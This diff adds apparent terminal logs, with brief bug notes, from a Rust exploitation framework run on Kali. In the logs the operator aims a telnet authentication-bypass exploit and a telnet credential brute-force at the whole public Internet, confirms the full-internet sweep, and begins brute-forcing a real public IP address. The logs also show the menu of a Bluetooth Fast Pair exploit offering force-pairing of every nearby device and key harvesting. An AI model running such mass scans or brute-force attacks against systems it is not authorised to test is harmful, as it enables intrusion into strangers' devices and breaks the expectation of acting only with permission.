@@ -1,0 +1,154 @@
+rsf> use exploits/telnet/telnet_auth_bypass_cve_2026_24061
+Module 'exploits/telnet/telnet_auth_bypass_cve_2026_24061' selected.
+rsf> t 0.0.0.0
+Target set to: 0.0.0.0
+rsf> run
+[*] Using target: 0.0.0.0
+Running module 'exploits/telnet/telnet_auth_bypass_cve_2026_24061' against target '0.0.0.0'
+[*] Random mass scan — running 'Telnet Authentication Bypass CVE-2026-24061' against random public IPs (Ctrl+C to stop)
+[*] Will scan up to 10000 random hosts with concurrency 2
+[*] Progress: 1 processed | 0 ok | 0 err | 0 skipped
+progress never updates
+
+issues cant test or try gidden devices
+
+exploitall Module 'exploits/bluetooth/wpair' selected.
+rsf> run
+[!] Warning: No target set.
+Do you want to provide a target address? (y/n) [y]: y
+Enter target []: 0.0.0.0
+[*] Target set to '0.0.0.0'
+Running module 'exploits/bluetooth/wpair' against target '0.0.0.0'
+[!] Random mass scan: 'WPair — Fast Pair Exploit (WhisperPair) — CVE-2025-36911' will probe public hosts across the whole Internet.
+    Settings for this sweep (override with `setg <key> <value>`):
+      port:            none — this module declares no default port, so every host is probed
+      concurrency:     50   (setg concurrency <n>)
+      host cap:        3678797824 hosts   (setg max_random_hosts <n>)
+      per-host timeout:5s   (setg timeout <n>)
+      exclusions:      29 networks excluded (RFC1918/bogons/...)   (setg exclusions ...)
+Proceed with the full-internet sweep? (y/n) [n]: ^C
+
+
+┌──(kali㉿kali)-[~/Downloads/rustpre2-main]
+└─$
+
+
+
+Module 'exploits/bluetooth/wpair' selected.
+rsf> run
+[!] Warning: No target set.
+Do you want to provide a target address? (y/n) [y]: y
+Enter target []: 127.0.0.1
+[*] Target set to '127.0.0.1'
+Running module 'exploits/bluetooth/wpair' against target '127.0.0.1'
+╔═══════════════════════════════════════════════════════════╗
+║   WPair — Google Fast Pair Exploit (WhisperPair)          ║
+║   CVE-2025-36911 — ECDH Key-Based Pairing bypass          ║
+╚═══════════════════════════════════════════════════════════╝
+[*] 2883 known Fast Pair models loaded (COSIC WhisperPair dataset).
+
+Commands:
+  scan                 discover Fast Pair devices in range
+  info                 show discovered devices + AS-key availability
+  select <MAC>         set the current target
+  exploit              full ECDH KBP exploit on the target (force-pair)
+  testall              non-destructive vuln test on every discovered device
+  exploitall           run the full exploit on every discovered device
+  nonce                conformance: KBP replay / nonce-freshness (§4.3)
+  curve                conformance: off-curve point validation (§4.5)
+  pair                 bond via bluetoothctl (pair+trust+connect)
+  rename <name>        write a personalized device name (§3.3.5)
+  switch               audio-switch using the planted account key (§5.3.3)
+  harvest              fetch seed-model AS keys from the metadata API
+  help | quit
+Globals: setg target_mac <MAC> | adapter <n> | scan_secs <s> | model_id <0x..> |
+         antispoofing_key <base64> | gfp_metadata_url <tmpl> | gfp_api_key <key>
+
+wpair (help for commands) [help]: exploitall
+[-] nothing discovered — run 'scan' first
+wpair (help for commands) [help]: scan'
+[-] unknown command 'scan'' — type 'help'
+wpair (help for commands) [help]: scan
+[*] Scanning 15s for Fast Pair (all devices in range) ...
+[-] No Fast Pair devices visible.
+wpair (help for commands) [help]: scan
+[*] Scanning 15s for Fast Pair (all devices in range) ...
+[-] No Fast Pair devices visible.
+wpair (help for commands) [help]: quit
+rsf> run
+[*] Using target: 127.0.0.1
+Running module 'exploits/bluetooth/wpair' against target '127.0.0.1'
+╔═══════════════════════════════════════════════════════════╗
+║   WPair — Google Fast Pair Exploit (WhisperPair)          ║
+║   CVE-2025-36911 — ECDH Key-Based Pairing bypass          ║
+╚═══════════════════════════════════════════════════════════╝
+[*] 2883 known Fast Pair models loaded (COSIC WhisperPair dataset).
+
+Commands:
+  scan                 discover Fast Pair devices in range
+  info                 show discovered devices + AS-key availability
+  select <MAC>         set the current target
+  exploit              full ECDH KBP exploit on the target (force-pair)
+  testall              non-destructive vuln test on every discovered device
+  exploitall           run the full exploit on every discovered device
+  nonce                conformance: KBP replay / nonce-freshness (§4.3)
+  curve                conformance: off-curve point validation (§4.5)
+  pair                 bond via bluetoothctl (pair+trust+connect)
+  rename <name>        write a personalized device name (§3.3.5)
+  switch               audio-switch using the planted account key (§5.3.3)
+  harvest              fetch seed-model AS keys from the metadata API
+  help | quit
+Globals: setg target_mac <MAC> | adapter <n> | scan_secs <s> | model_id <0x..> |
+         antispoofing_key <base64> | gfp_metadata_url <tmpl> | gfp_api_key <key>
+
+wpair (help for commands) [help]: scan
+[*] Scanning 15s for Fast Pair (all devices in range) ...
+[-] No Fast Pair devices visible.
+wpair (help for commands) [help]: info
+[*] No devices discovered yet — run 'scan'
+
+
+
+
+Total: 387 modules
+rsf> use creds/generic/telnet_bruteforce
+
+Module 'creds/generic/telnet_bruteforce' selected.
+rsf> setg target 0.0.0.0
+Target set to: 0.0.0.0
+    ⚠ Full-internet sweep (every public host). You'll be asked to confirm at run time.
+    [*] max_random_hosts already set — leaving operator value alone.
+rsf> setg port 2323
+port => 2323
+rsf> run
+[*] Using target: 0.0.0.0/0
+Running module 'creds/generic/telnet_bruteforce' against target '0.0.0.0/0'
+[!] Random mass scan: 'Telnet Bruteforce' will probe public hosts across the whole Internet.
+    Settings for this sweep (override with `setg <key> <value>`):
+      port:            2323  (from `setg port`; this module's default is 23)
+      concurrency:     50   (setg concurrency <n>)
+      host cap:        3678797824 hosts   (setg max_random_hosts <n>)
+      per-host timeout:5s   (setg timeout <n>)
+      exclusions:      29 networks excluded (RFC1918/bogons/...)   (setg exclusions ...)
+Proceed with the full-internet sweep? (y/n) [n]: y
+[*] Mass scan mode — configuring module options (answers apply to ALL targets)
+    Tip: pre-set values with 'setg <key> <value>' to skip prompts next time.
+
+
+[*] Random mass scan — running 'Telnet Bruteforce' against random public IPs (Ctrl+C to stop)
+[*] Will scan up to 3678797824 hosts with concurrency 50 (ZMap-style stateless permutation — no repeats)
+[*] Progress: 1/3678797824 (0.0%) examined | 0 hits | 0 ran (0 ok / 0 err) | 0 skipped
+
+
+[*] Starting brute-force on 5.218.79.63:23
+[*] Total attempts: 8
+
+[Progress] 0/8 (0.0%) | 0 OK | 0 err | 0 retry | 0.0/s | ETA: 00:00
+[*] Starting brute-force on 5.218.79.63:23
+[*] Total attempts: 8
+
+
+
+
+
+
